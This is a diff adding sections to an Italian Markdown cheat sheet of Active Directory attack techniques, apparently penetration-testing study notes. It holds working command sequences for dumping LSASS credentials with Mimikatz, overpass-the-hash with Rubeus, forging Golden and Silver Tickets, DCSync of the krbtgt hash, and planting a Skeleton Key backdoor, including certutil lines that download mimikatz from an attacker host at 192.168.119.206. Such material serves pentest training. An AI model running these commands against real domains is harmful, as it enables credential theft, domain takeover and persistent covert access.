@@ -127,6 +127,7 @@
 ## Archiviazione e recupero credenziali memorizzate (Lateral Movement)
 ### Poiché l'implementazione di Kerberos da parte di Microsoft utilizza il single sign-on, gli hash delle password devono essere archiviati da qualche parte per rinnovare una richiesta TGT. Nelle versioni correnti di Windows, questi hash sono archiviati nello spazio di memoria LSASS (Local Security Authority Subsystem Service). Se otteniamo l'accesso a questi hash, potremmo craccarli per ottenere la password in chiaro o riutilizzarli per eseguire varie azioni.
 ### Problemi: Sebbene questo sia l'obiettivo finale del nostro attacco AD, il processo non è così semplice come sembra. Poiché il processo LSASS fa parte del sistema operativo e viene eseguito come SYSTEM, abbiamo bisogno delle autorizzazioni SYSTEM (o amministratore locale) per ottenere l'accesso agli hash archiviati su una destinazione.Per questo motivo, per prendere di mira gli hash archiviati, spesso dobbiamo iniziare il nostro attacco con un'escalation dei privilegi locali. Per rendere le cose ancora più complicate, le strutture di dati utilizzate per archiviare gli hash in memoria non sono pubblicamente documentate e sono anche crittografate con una chiave archiviata in LSASS.
+##Prerequisito: Devi essere Local Domain Admin dentro la macchina exploitata 
 
 - Uso reg per recupero NTLM
 ```
@@ -142,3 +143,102 @@
 			- impacket-psexec username:password@IP
 			- xfreerdp /u:david /d:xor.com /p:dsfdf34534tdfGDFG5rdgr  /v:10.11.1.120
 ```
+- Con Invoke-Mimikatz
+```
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command ' "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" '
+```
+- Over pass the Hash
+```
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"sekurlsa::pth" "user:Administrator" "domain:dollarcorp.moneycorp.local" "ntlm:<ntlmhash>" "run:powershell.exe"'
+```
+o
+```
+			- Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt
+```
+
+## Golden Ticket
+### Tornando alla spiegazione dell'autenticazione Kerberos, ricordiamo che quando un utente inoltra una richiesta per un TGT, il KDC crittografa il TGT con una chiave segreta nota solo ai KDC nel dominio. Questa chiave segreta è in realtà l'hash della password di un account utente di dominio chiamato krbtgt. Se riusciamo a mettere le mani sull'hash della password krbtgt, potremmo creare i nostri TGT personalizzati o biglietti d'oro.
+### Ad esempio, potremmo creare un TGT in cui si afferma che un utente senza privilegi è in realtà un membro del gruppo Domain Admins e il controller di dominio lo considererà attendibile poiché è crittografato correttamente.
+## Prerequisito: In questa fase del coinvolgimento, dovremmo avere accesso a un account che è un membro del gruppo Domain Admins oppure aver compromesso il controller di dominio stesso.  
+
+- Ottenere nel DC come DA HASH krbtgt 
+```
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc-corp
+```
+
+```
+			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+			- mimikatz.exe '"lsadump::lsa /patch"' -Computername dc-corp
+```
+- Usare HASH krbtgt per creare un Golden ticket per un user non autenticato 
+```
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/krbtgt:$NTLM_HASH" "id:500" "groups:512" "/user:fakeuser" "/ptt"'
+```	
+```
+			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+			- mimikatz.exe '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "id:500" "groups:512" "/krbtgt:$NTLM_HASH" "/user:fakeuser" "/ptt"'
+```
+- Si può usare la funzione DCSync per ottenere hash krbtgt usando Mimikatz
+```
+			- mimikatz.exe '"lsadump::dcsync" "/user:$DOMAIN\krbtgt"'
+			- Invoke-Mimikatz -Command  '"lsadump::dcsync" "/user:$DOMAIN\krbtgt"'
+```
+## Silver Ticket
+### I Silver Ticket sono ticket TGS (Ticket Granting Service) contraffatti creati da un utente malintenzionato utilizzando l'hash della password di un account di servizio compromesso. Quando un utente malintenzionato ha violato la password di un account di servizio, potrebbe sembrare che non avrebbe bisogno di falsificare i ticket per agire per suo conto. Mentre un biglietto d'oro è un TGT falso valido per ottenere l'accesso a qualsiasi servizio Kerberos, il biglietto d'argento è un TGS contraffatto. Ciò significa che l'ambito Silver Ticket è limitato a qualsiasi servizio destinato a un server specifico.
+### Mentre un ticket Golden viene crittografato/firmato con l'account del servizio Kerberos di dominio ( KRBTGT) , un ticket Silver viene crittografato/firmato dall'account del servizio (credenziale dell'account del computer estratta dal SAM locale del computer o credenziale dell'account del servizio)
+### I biglietti d'argento possono essere più pericolosi dei biglietti d'oro: sebbene l'ambito sia più limitato dei biglietti d'oro, l'hash richiesto è più facile da ottenere e non c'è comunicazione con un controller di dominio quando li si utilizza, quindi il rilevamento è più difficile di quelli d'oro Biglietti.
+## Prerequisito: Per creare o falsificare un Silver Ticket, l'attaccante deve conoscere i dati della password (hash della password) per il servizio di destinazione. Se il servizio di destinazione è in esecuzione nel contesto di un account utente, come MS-SQL, è necessario l'hash della password dell'account di servizio per creare un Silver Ticket. (https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)
+- Servizio CIFS (Ma possono essere altri servizi come HOST). Il servizio CIFS permette di accedere al file system della vittima.
+```
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/service:CIFS" "/target:$TARGET_SERVER_FQDN" /user:NonExistentUser /rc4:$NTLM_HASH_Service_Account '
+			- Invoke-Mimikatz -Command 'kerberos::ptt ticket.kirbi'
+			- .\PsExec.exe -accepteula \\TARGET_SERVER_FQDN cmd (ottenere la shell)
+			o
+			- dir \\TARGET_SERVER_FQDN\C$
+```
+
+```
+			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+			- mimikatz.exe '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/service:CIFS" "/target:$TARGET_SERVER_FQDN" /user:NonExistentUser /rc4:$NTLM_HASH_Service_Account'
+			- mimikatz.exe "kerberos::ptt ticket.kirbi" (Inject in memory using mimikatz or Rubeus)
+			o
+			- .\Rubeus.exe ptt /ticket:ticket.kirbi
+			-.\PsExec.exe -accepteula \\TARGET_SERVER_FQDN cmd (ottenere la shell)
+			o
+			- dir \\TARGET_SERVER_FQDN\C$
+```
+## Skeleton Key
+### Questo attacco si impianta in LSASS e crea una password principale che funzionerà per qualsiasi account Active Directory nel dominio. Poiché anche le attuali password degli utenti continuano a funzionare, un attacco Skeleton Key non interromperà il processo di autenticazione, quindi gli attacchi sono difficili da individuare a meno che tu non sappia cosa cercare. Il riavvio del DC rimuoverà questo attacco. Si potrà accedere a qualsiasi pc con username valido e password che di default sarà mimikatz
+## Prerequisiti: Essere un utente del gurppo Domain Admins
+```
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName FQDN
+```	
+```
+			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+			- mimikatz.exe '"privilege::debug" "misc::skeleton" "/target: FQDN_DC"'
+			- Enter-PSSession -Computername DC -credential Domain\Administrator
+```			
+### Se LSASS sta runnando come processo protetto si può usare ancora questa tecnica, tuttavia avrà bisogno del driver mimikatz(mimidriv.sys) sul disco del DC target
+```
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "misc::skeleton" "!-"' -ComputerName FQDN
+```	
+```
+			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+			- mimikatz.exe '"privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "/target: FQDN_DC" "misc::skeleton" "!-"'
+			- Enter-PSSession -Computername DC -credential Domain\Administrator
+```
+## DSRM (Directory Services Restore Mode)
